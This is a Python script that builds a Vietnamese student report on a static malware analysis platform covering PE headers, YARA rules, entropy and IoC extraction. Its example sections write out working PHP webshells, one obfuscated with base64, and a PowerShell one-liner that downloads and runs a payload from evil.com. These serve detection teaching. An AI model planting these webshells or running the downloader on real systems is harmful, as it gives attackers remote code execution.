#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sinh báo cáo đồ án Word (>=20 trang) cho "Malware Analysis Platform".

Báo cáo gồm đầy đủ các phần: giới thiệu, cơ sở lý thuyết, kiến trúc,
quy trình phân tích, các module, thực nghiệm, kết luận.
Mỗi phần đều có hình minh họa (đã tạo bằng generate_report_assets.py).
"""
import os
from docx import Document
from docx.shared import Pt, Inches, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.section import WD_SECTION
from docx.oxml.ns import qn
from docx.oxml import OxmlElement

BASE = os.path.dirname(os.path.abspath(__file__))
ASSETS = os.path.join(BASE, "assets")
OUT = os.path.join(BASE, "BAO_CAO_MALWARE_ANALYSIS.docx")

doc = Document()

# ============ Cấu hình font & style ============
style = doc.styles["Normal"]
style.font.name = "Calibri"
style.font.size = Pt(11)
style.paragraph_format.line_spacing = 1.3
style.paragraph_format.space_after = Pt(6)

for level, size in [(1, 22), (2, 16), (3, 13)]:
    h = doc.styles[f"Heading {level}"]
    h.font.name = "Calibri"
    h.font.size = Pt(size)
    h.font.color.rgb = RGBColor(0x1E, 0x3A, 0x8A)
    h.font.bold = True


def heading(text, level=1):
    h = doc.add_heading(text, level=level)
    return h


def para(text, bold=False, italic=False, align=None):
    p = doc.add_paragraph()
    run = p.add_run(text)
    run.bold = bold
    run.italic = italic
    if align:
        p.alignment = align
    return p


def bullet(text):
    p = doc.add_paragraph(style="List Bullet")
    p.add_run(text)
    return p


def add_image(path, width_in=6.3, caption=None):
    if os.path.exists(path):
        doc.add_picture(path, width=Inches(width_in))
        if caption:
            c = doc.add_paragraph()
            c.alignment = WD_ALIGN_PARAGRAPH.CENTER
            r = c.add_run(caption)
            r.italic = True
            r.font.size = Pt(9)
            r.font.color.rgb = RGBColor(0x6B, 0x72, 0x80)
    else:
        para(f"[Hình thiếu: {path}]", italic=True)


def code_block(lines):
    """Thêm khối mã với nền xám nhạt."""
    for line in lines:
        p = doc.add_paragraph()
        r = p.add_run(line)
        r.font.name = "Consolas"
        r.font.size = Pt(9)
        r.font.color.rgb = RGBColor(0xC7, 0x25, 0x4E)
        p.paragraph_format.space_after = Pt(0)
        p.paragraph_format.left_indent = Inches(0.3)


def page_break():
    doc.add_page_break()


# =====================================================================
# TRANG BÌA
# =====================================================================
for _ in range(4):
    doc.add_paragraph()

title = doc.add_paragraph()
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = title.add_run("MALWARE ANALYSIS PLATFORM")
r.bold = True
r.font.size = Pt(34)
r.font.color.rgb = RGBColor(0x1E, 0x3A, 0x8A)

sub = doc.add_paragraph()
sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = sub.add_run("Nền tảng phân tích mã độc tĩnh tự động\n(PE Header · YARA · Entropy · IoC)")
r.font.size = Pt(16)
r.font.color.rgb = RGBColor(0x3B, 0x82, 0xF6)

for _ in range(3):
    doc.add_paragraph()

for line in ["ĐỒ ÁN MÔN PHÂN TÍCH MÃ ĐỘC", "", "Sinh viên thực hiện: Ngô Long", "Trường: HUIT — Đại học Công nghiệp TP.HCM", "", "Năm 2026"]:
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    if "Ngô Long" in line or "HUIT" in line:
        p.add_run(line).font.size = Pt(13)
    else:
        p.add_run(line).bold = True

page_break()

# =====================================================================
# MỤC LỤC (thô — người dùng tự tạo TOC trong Word)
# =====================================================================
heading("MỤC LỤC", 1)
toc = [
    "1. GIỚI THIỆU ĐỀ TÀI",
    "2. CƠ SỞ LÝ THUYẾT",
    "   2.1. Phân tích mã độc tĩnh vs động",
    "   2.2. Cấu trúc PE (Portable Executable)",
    "   2.3. YARA Rules",
    "   2.4. Shannon Entropy",
    "   2.5. Indicators of Compromise (IoC)",
    "3. KIẾN TRÚC HỆ THỐNG",
    "   3.1. Tổng quan",
    "   3.2. Frontend",
    "   3.3. Backend API (FastAPI)",
    "   3.4. Các module phân tích",
    "4. QUY TRÌNH PHÂN TÍCH MÃ ĐỘC",
    "5. CHI TIẾT CÁC MODULE",
    "   5.1. malware_analyzer.py",
    "   5.2. yara_engine.py",
    "   5.3. webshell_detector.py",
    "   5.4. cvss_scoring.py",
    "6. THỰC NGHIỆM & KẾT QUẢ",
    "7. TRIỂN KHAI (DEPLOY)",
    "8. KẾT LUẬN & HƯỚNG PHÁT TRIỂN",
]
for t in toc:
    para(t, bold=(not t.startswith("   ")))

page_break()

# =====================================================================
# 1. GIỚI THIỆU
# =====================================================================
heading("1. GIỚI THIỆU ĐỀ TÀI", 1)
para("Trong bối cảnh tấn công mạng ngày càng gia tăng, mã độc (malware) là mối đe dọa "
     "hàng đầu đối với các hệ thống thông tin. Việc phát hiện và phân tích mã độc là bước "
     "nền tảng để ứng phó sự cố, ngăn chặn lây lan và truy vết nguồn gốc tấn công.")
para("Đồ án này xây dựng một Nền tảng phân tích mã độc (Malware Analysis Platform) — "
     "một hệ thống web có khả năng tiếp nhận tệp tin, thực hiện PHÂN TÍCH TĨNH (static analysis) "
     "tự động và cho kết quả chi tiết: nhận diện loại file, băm mật mã (MD5/SHA-256), "
     "phân tích PE header, quét YARA rules, đo entropy Shannon, trích xuất IoC và phân loại họ mã độc.")

heading("1.1. Mục tiêu", 2)
bullet("Xây dựng công cụ phân tích tĩnh mã độc đa định dạng (PE/EXE, PHP, Python, PowerShell, VBScript, Batch...).")
bullet("Tích hợp các kỹ thuật chuẩn: pefile, yara-python, entropy, regex IoC.")
bullet("Cung cấp giao diện trực quan và báo cáo chi tiết phục vụ nghiên cứu, học tập.")
bullet("Triển khai được trên môi trường web (frontend tĩnh + backend động).")

heading("1.2. Phạm vi", 2)
para("Đồ án tập trung vào PHÂN TÍCH TĨNH — phân tích mã độc KHÔNG cần thực thi mẫu. "
     "Phạm vi bao gồm các loại mã độc: webshell/backdoor (PHP/ASP/JSP), script độc hại "
     "(PowerShell, VBScript, Batch, Python), và file thực thi Windows (PE/EXE).")

page_break()

# =====================================================================
# 2. CƠ SỞ LÝ THUYẾT
# =====================================================================
heading("2. CƠ SỞ LÝ THUYẾT", 1)

heading("2.1. Phân tích mã độc tĩnh vs động", 2)
para("Phân tích tĩnh (static analysis) là kỹ thuật phân tích mã độc bằng cách kiểm tra "
     "tệp tin mà KHÔNG thực thi nó. Ưu điểm là an toàn (không gây hại cho hệ thống phân tích), "
     "nhanh chóng, phù hợp để phân loại và trích xuất đặc trưng ban đầu. Nhược điểm là khó "
     "phân tích mã bị pack/obfuscate mạnh — trường hợp đó cần phân tích động (chạy trong sandbox).")
para("Đồ án này dùng phân tích tĩnh làm lõi, kết hợp các kỹ thuật đo entropy để nhận biết "
     "mã đã bị nén/mã hóa nhằm định hướng bước phân tích tiếp theo.")

heading("2.2. Cấu trúc PE (Portable Executable)", 2)
para("PE là định dạng tệp thực thi chuẩn của Windows (file .exe, .dll, .sys). Cấu trúc PE gồm:")
bullet("DOS Header (bắt đầu bằng magic \"MZ\") và PE Signature.")
bullet("File Header: loại máy (machine), số section, timestamp biên dịch.")
bullet("Optional Header: Entry Point (điểm vào), ImageBase, Subsystem.")
bullet("Section Table: các section .text (mã), .data (dữ liệu), .rsrc (tài nguyên)...")
bullet("Import/Export Table: danh sách API nhập/xuất — dấu hiệu quan trọng để đoán hành vi.")
para("Phân tích Import Table giúp phát hiện mã gọi API nhạy cảm (CreateProcess, socket, "
     "VirtualAlloc, WriteProcessMemory...) — một trong những chỉ báo mã độc mạnh nhất.")
add_image(os.path.join(ASSETS, "pe_structure.png"), 5.5, "Hình 1. Cấu trúc tệp PE")

heading("2.3. YARA Rules", 2)
para("YARA là công cụ nhận diện và phân loại mã độc dựa trên các quy tắc (rules) mô tả "
     "chuỗi ký tự (string) và biểu thức điều kiện (condition). Mỗi rule khớp khi mẫu chứa "
     "đủ các chuỗi theo điều kiện đặt ra. Đồ án định nghĩa 9 YARA rules nhận diện các họ "
     "webshell và mã độc phổ biến.")

heading("2.4. Shannon Entropy", 2)
para("Entropy đo độ \"hỗn loạn\" của dữ liệu (đơn vị bit/ký tự, tối đa 8). Tệp thông thường "
     "(mã nguồn, văn bản) có entropy thấp (4–6); tệp bị nén hoặc mã hóa có entropy cao (≈7–8). "
     "Entropy cao là tín hiệu quan trọng cho thấy mã có thể bị PACK hoặc ENCRYPT để né phân tích.")
add_image(os.path.join(ASSETS, "entropy.png"), 5.8, "Hình 2. Thang entropy và ví dụ")

heading("2.5. Indicators of Compromise (IoC)", 2)
para("IoC là các dấu vết cho thấy hệ thống có thể đã bị xâm nhập: địa chỉ IP, tên miền, "
     "URL của máy chủ điều khiển (C2). Trích xuất IoC từ mã độc giúp chặn liên lạc C2 tại "
     "tường lửa và truy vết chiến dịch tấn công.")

page_break()

# =====================================================================
# 3. KIẾN TRÚC
# =====================================================================
heading("3. KIẾN TRÚC HỆ THỐNG", 1)

heading("3.1. Tổng quan", 2)
para("Hệ thống gồm 2 tầng chính: Frontend (giao diện web) và Backend (API phân tích). "
     "Frontend có thể chạy độc lập trên GitHub Pages (phân tích nhẹ phía client), hoặc gọi "
     "Backend FastAPI (deploy trên Render) để phân tích chuyên sâu.")
add_image(os.path.join(ASSETS, "architecture.png"), 6.3, "Hình 3. Kiến trúc hệ thống")

heading("3.2. Frontend", 2)
para("Frontend được xây dựng bằng HTML/CSS/JavaScript, gồm các tab:")
bullet("Tab Phát hiện: danh sách file và mức độ nguy hiểm.")
bullet("Tab Phân tích mã độc: chi tiết hash, entropy, PE, IoC, bằng chứng phát hiện, luồng tấn công và quy trình mổ xẻ 6 bước.")
bullet("Tab Đánh giá: thống kê họ mã độc, mức độ, CVSS, IoC.")
bullet("Tab Khắc phục: đánh giá theo MITRE ATT&CK + hành động khắc phục.")

heading("3.3. Backend API (FastAPI)", 2)
para("Backend xây dựng bằng Python + FastAPI, nhận file upload (multipart) và trả kết quả JSON chi tiết. "
     "Các endpoint chính:")
code_block([
    "POST /api/analyze           # phân tích 1 file",
    "POST /api/analyze-multiple  # phân tích nhiều file",
    "GET  /api/health            # kiểm tra trạng thái",
    "GET  /docs                  # tài liệu Swagger",
])

heading("3.4. Các module phân tích", 2)
bullet("malware_analyzer.py — phân tích tổng hợp: hash, entropy, PE, IoC, phân loại họ.")
bullet("yara_engine.py — nạp và biên dịch YARA rules, quét mẫu.")
bullet("webshell_detector.py — giải mã obfuscation + data-flow + polyglot.")
bullet("cvss_scoring.py — chấm điểm CVSS 3.1, ánh xạ CWE và MITRE ATT&CK.")
add_image(os.path.join(ASSETS, "tech_stack.png"), 6.3, "Hình 4. Stack công nghệ")

page_break()

# =====================================================================
# 4. QUY TRÌNH PHÂN TÍCH
# =====================================================================
heading("4. QUY TRÌNH PHÂN TÍCH MÃ ĐỘC", 1)
para("Hệ thống thực hiện quy trình phân tích tĩnh gồm 6 bước chuẩn, áp dụng cho từng tệp tin:")
add_image(os.path.join(ASSETS, "pipeline.png"), 4.8, "Hình 5. Quy trình phân tích 6 bước")

steps_desc = [
    ("Bước 1 — Nhận diện loại file", "Đọc magic bytes và phần mở rộng để xác định loại file "
     "(PE, ELF, PHP, PowerShell...). Loại file quyết định cách mổ xẻ tiếp theo."),
    ("Bước 2 — Băm mật mã (hash)", "Tính MD5, SHA-1, SHA-256, SHA-512. Kết quả là \"dấu vân tay\" "
     "duy nhất, dùng để tra cứu danh tiếng trên VirusTotal/MalwareBazaar."),
    ("Bước 3 — Đo entropy", "Tính entropy Shannon. Entropy cao (>7) cảnh báo mã có thể bị pack/encrypt, "
     "cần unpack trước khi phân tích sâu."),
    ("Bước 4 — Mổ xẻ cấu trúc", "Với PE: phân tích Import/Export Table, section, entry point, phát hiện packer. "
     "Với script: đọc mã nguồn tìm lệnh sink (eval, system, socket...)."),
    ("Bước 5 — Trích xuất IoC", "Tìm IP, URL, domain — dấu vết máy chủ C2 để chặn tại tường lửa."),
    ("Bước 6 — Kết luận", "Tổng hợp dấu hiệu để kết luận mẫu có phải mã độc không, thuộc họ nào, "
     "và ánh xạ vào MITRE ATT&CK."),
]
for t, d in steps_desc:
    heading(t, 3)
    para(d)

add_image(os.path.join(ASSETS, "kill_chain.png"), 4.2, "Hình 6. Luồng tấn công (kill chain)")

page_break()

# =====================================================================
# 5. CHI TIẾT MODULE
# =====================================================================
heading("5. CHI TIẾT CÁC MODULE", 1)

heading("5.1. malware_analyzer.py", 2)
para("Module lõi, thực hiện phân tích tổng hợp. Các hàm chính:")
bullet("compute_hashes(data) — tính 4 loại hash (MD5/SHA1/SHA256/SHA512).")
bullet("shannon_entropy(data) — tính entropy Shannon.")
bullet("detect_file_type(data) — nhận diện loại file bằng magic bytes.")
bullet("analyze_pe(data) — phân tích PE header (machine, sections, entry point, packer, import).")
bullet("extract_iocs(text) — trích xuất IP/URL/domain bằng regex.")
bullet("classify_malware_family(...) — phân loại họ mã độc.")
bullet("analyze_malware_bytes(data, filename) — hàm tổng hợp trả kết quả đầy đủ.")
para("Ví dụ mã trích xuất IoC bằng regex:", italic=True)
code_block([
    "_IP_RE    = re.compile(r\"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b\")",
    "_URL_RE   = re.compile(r\"https?://[^\\s'\\\">\\$]{4,}\")",
    "_DOMAIN_RE = re.compile(r\"\\b(?:[a-z0-9-]+\\.)+(?:com|net|org|...)\\b\", re.I)",
])

heading("5.2. yara_engine.py", 2)
para("Nạp và biên dịch các file .yar từ thư mục rules/, sau đó quét mẫu bằng yara-python. "
     "Hàm scan_bytes(data) nhận dữ liệu bytes trực tiếp (phù hợp API nhận upload). "
     "Có fallback: nếu yara-python không cài được, trả danh sách rỗng mà không phá vỡ hệ thống.")

heading("5.3. webshell_detector.py", 2)
para("Module phát hiện webshell/backdoor bằng nhiều tầng:")
bullet("Regex chữ ký cho các hàm nguy hiểm (eval, system, shell_exec, assert...).")
bullet("Data-flow analysis: theo dõi biến từ input (\\$_GET/\\$_POST) qua giải mã đến hàm sink.")
bullet("Phát hiện polyglot (file ảnh chứa mã nhúng).")

heading("5.4. cvss_scoring.py", 2)
para("Chấm điểm CVSS 3.1 (chuẩn FIRST.org) cho từng phát hiện, ánh xạ CWE (Common Weakness "
     "Enumeration) và MITRE ATT&CK (kỹ thuật tấn công). Ví dụ: reverse shell → CVSS 10.0 Critical "
     "(CWE-78), command execution → 9.8 Critical, file upload → 8.7 High (CWE-434).")

page_break()

# =====================================================================
# 6. THỰC NGHIỆM
# =====================================================================
heading("6. THỰC NGHIỆM & KẾT QUẢ", 1)
para("Bộ dữ liệu kiểm thử gồm 45 mẫu (30 mã độc + 15 benign) trải nhiều định dạng. "
     "Kết quả phân tích minh họa:")

heading("6.1. Ví dụ 1: Webshell PHP đơn giản", 2)
code_block(["<?php", "@eval($_POST['cmd']);", "?>"])
para("Kết quả phân tích:")
bullet("Family: Webshell (web backdoor)")
bullet("YARA: Webshell_PHP_Eval (CWE-94, MITRE T1505.003)")
bullet("Entropy: 5.31 (thấp — mã nguồn đọc được)")
bullet("Hash MD5: b4222ff24fe7e5c52d5df6a984882dad")
para("Giải thích: eval() thực thi chuỗi từ \\$_POST['cmd'] — kẻ tấn công gửi lệnh qua HTTP "
     "để chạy trực tiếp trên server (RCE).")

heading("6.2. Ví dụ 2: Webshell Obfuscated (base64)", 2)
code_block(["<?php", "$a = base64_decode('c2hlbGxfZXhlYw==');  // = \"shell_exec\"", "@eval($a($_POST['x']));", "?>"])
para("Kết quả phân tích:")
bullet("Family: PHP Obfuscated Webshell (base64/hex)")
bullet("Bằng chứng: base64_decode(), eval(), $\\_POST")
bullet("Giải mã payload: base64_decode → \"shell_exec\"")
bullet("Luồng tấn công: input → giải mã → eval → RCE")
para("Giải thích: mã dùng base64_decode để GIẤU chuỗi \"shell_exec\" nhằm né quét chữ ký. "
     "Khi giải mã thì mới lộ ra lệnh độc.")

heading("6.3. Ví dụ 3: PowerShell downloader", 2)
code_block(["IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"])
para("Kết quả phân tích:")
bullet("Family: PowerShell Malware (fileless)")
bullet("YARA: Malware_PowerShell_Downloader")
bullet("IoC: URL http://evil.com/payload.ps1, domain evil.com, IP 192.168.1.50")
para("Giải thích: mã tải payload từ URL từ xa rồi thực thi trong bộ nhớ (fileless), "
     "không ghi file xuống đĩa nên khó bị phát hiện bởi phần mềm diệt virus truyền thống.")

heading("6.4. Bảng tổng hợp kết quả", 2)
para("Hệ thống phát hiện chính xác các họ mã độc trong bộ test:", bold=True)
bullet("Webshell PHP (eval/assert/command exec/reverse/upload) — 9 rule YARA.")
bullet("PowerShell fileless, VBScript persistence, Python RAT, Batch script.")
bullet("Phát hiện packer (UPX) qua entropy section + tên section.")

page_break()

# =====================================================================
# 7. TRIỂN KHAI
# =====================================================================
heading("7. TRIỂN KHAI (DEPLOY)", 1)
para("Hệ thống triển khai theo mô hình 2 tầng:")
bullet("Frontend: GitHub Pages (tĩnh) — https://longngoryo.github.io/SIIScan/")
bullet("Backend: Render (động) — FastAPI /api/analyze")
para("Lưu ý: GitHub Pages là trang tĩnh nên KHÔNG chạy được Python. Để có phân tích động "
     "(PE header đầy đủ, YARA), cần backend riêng deploy trên Render hoặc nền tảng tương tự. "
     "Frontend tự phát hiện backend qua biến API_BASE_URL trong app.js.")

page_break()

# =====================================================================
# 7bis. CHI TIẾT GIAO DIỆN
# =====================================================================
heading("8. HƯỚNG DẪN SỬ DỤNG & GIAO DIỆN", 1)

heading("8.1. Các chức năng chính", 2)
bullet("Kéo-thả file hoặc chọn thư mục để phân tích.")
bullet("Nhập đường dẫn server để quét thư mục trên máy chủ.")
bullet("Xem kết quả theo 4 tab: Phát hiện, Phân tích mã độc, Đánh giá, Khắc phục.")
bullet("Xuất báo cáo PDF/CSV với đầy đủ chi tiết.")

heading("8.2. Tab Phân tích Mã độc", 2)
para("Đây là tab trọng tâm của môn học. Với mỗi tệp tin, tab hiển thị 8 khối thông tin:")
bullet("Family — phân loại họ mã độc (badge đỏ).")
bullet("Hash — MD5/SHA-1/SHA-256/SHA-512.")
bullet("Entropy — giá trị đo độ nén/mã hóa.")
bullet("Bằng chứng phát hiện — từng lệnh nguy hiểm kèm lý do.")
bullet("Giải mã payload — nội dung thật bị che giấu (base64/hex/gzip).")
bullet("Luồng tấn công — chuỗi hành động khai thác.")
bullet("Sơ đồ Kill Chain — 5 giai đoạn tấn công.")
bullet("Quy trình phân tích 6 bước — mổ xẻ chuẩn.")

heading("8.3. Tab Khắc phục", 2)
para("Đánh giá theo khung MITRE ATT&CK các kỹ thuật:")
bullet("T1059 / T1505.003 — Thực thi lệnh & Webshell.")
bullet("T1027 — Làm rối & che giấu mã (obfuscation).")
bullet("T1071 — Kênh điều khiển C2.")
bullet("T1105 — Tải payload từ xa.")
para("Kèm các hành động khắc phục: cách ly mã độc, chặn IoC, quét lại bằng YARA.")

page_break()

# =====================================================================
# 7ter. MỔ XẺ CHI TIẾT CÁC MẪU THỰC TẾ
# =====================================================================
heading("9. PHÂN TÍCH CHI TIẾT CÁC MẪU MÃ ĐỘC THỰC TẾ", 1)

heading("9.1. Webshell command execution (php_system_exec.php)", 2)
para("Mẫu sử dụng shell_exec/system để thực thi lệnh hệ thống trực tiếp từ input người dùng.")
code_block(["<?php", "system($_GET['cmd']);", "?>"])
para("Phân tích:")
bullet("Bước 1: Nhận diện — PHP script.")
bullet("Bước 2: Hash — MD5 được tính để đối chiếu.")
bullet("Bước 3: Entropy thấp (mã đọc được).")
bullet("Bước 4: Mổ xẻ — tìm thấy system() gọi trực tiếp input $_GET['cmd']")
bullet("Bước 5: IoC — không có (tấn công trực tiếp, không C2).")
bullet("Bước 6: Kết luận — MÃ ĐỘC, họ Webshell (Command Execution), CWE-78, MITRE T1059.")

heading("9.2. Reverse shell PHP (php_reverse_shell.php)", 2)
para("Mẫu tạo kết nối ngược (reverse shell) về máy hacker.")
bullet("Bước 4: Mổ xẻ — fsockopen/stream_socket_client mở socket.")
bullet("Bước 5: IoC — phát hiện IP/domain của máy hacker.")
bullet("Bước 6: Kết luận — Reverse Shell, CVSS 10.0 Critical.")

heading("9.3. PowerShell fileless (ps1_downloader.ps1)", 2)
para("Tải payload từ xa bằng WebClient và thực thi trong bộ nhớ.")
bullet("Bằng chứng: IEX, DownloadString, Net.WebClient.")
bullet("IoC: URL http://evil.com/payload.exe, IP 192.168.1.50.")
bullet("Kết luận: PowerShell Malware (fileless), MITRE T1059.001, T1105.")

heading("9.4. VBScript persistence (vbs_wscript.vbs)", 2)
para("Ghi registry Run key để tự chạy mỗi khi khởi động.")
bullet("Bằng chứng: WScript.Shell, RegWrite, CurrentVersion\\Run.")
bullet("Kết luận: VBScript Malware (registry/WMI persistence), MITRE T1547.001.")

heading("9.5. Python RAT (py_rat.py)", 2)
para("Kết nối socket về máy C2, nhận lệnh và thực thi.")
bullet("Bằng chứng: import socket, .connect(), .recv(), subprocess.")
bullet("IoC: IP máy C2.")
bullet("Kết luận: Python RAT / Reverse Shell, MITRE T1071.")

heading("9.6. PE packed (sample_upx_packed.exe)", 2)
para("File thực thi giả lập đã bị pack bằng UPX.")
bullet("Bước 1: Magic bytes MZ → PE_IMAGE.")
bullet("Bước 3: Entropy cao (7.8) → nghi ngờ packed.")
bullet("Bước 4: Mổ xẻ PE — section UPX0/UPX1, phát hiện packer.")
bullet("Bước 6: Kết luận — Windows Executable, nghi ngờ packed, cần unpack.")

page_break()

# =====================================================================
# 9. KẾT LUẬN
# =====================================================================
heading("10. KẾT LUẬN & HƯỚNG PHÁT TRIỂN", 1)

heading("10.1. Kết quả đạt được", 2)
bullet("Xây dựng hoàn chỉnh nền tảng phân tích mã độc tĩnh đa định dạng.")
bullet("Tích hợp đầy đủ: pefile (PE header), yara-python, Shannon entropy, trích xuất IoC.")
bullet("Giao diện trực quan kèm sơ đồ minh họa và quy trình phân tích 6 bước.")
bullet("Triển khai được trên web (frontend tĩnh + backend FastAPI động).")

heading("10.2. Hạn chế", 2)
bullet("Chỉ phân tích tĩnh — chưa phát hiện được mã tự giải mã khi chạy (cần phân tích động).")
bullet("yara-python khó cài trên nền tảng host free (cần libyara).")
bullet("Chưa tích hợp unpack tự động cho mã packed.")

heading("10.3. Hướng phát triển", 2)
bullet("Tích hợp sandbox (Cuckoo/CAPE) để phân tích động.")
bullet("Bổ sung unpacker (UPX unpack, Generic unpacker).")
bullet("Tích hợp tra cứu VirusTotal API tự động theo hash.")
bullet("Học máy (ML) để phân loại mã độc tự động.")
bullet("Phát hiện họ mã độc nâng cao (ransomware, keylogger, stealer).")

doc.save(OUT)
print(f"Đã tạo báo cáo Word: {OUT}")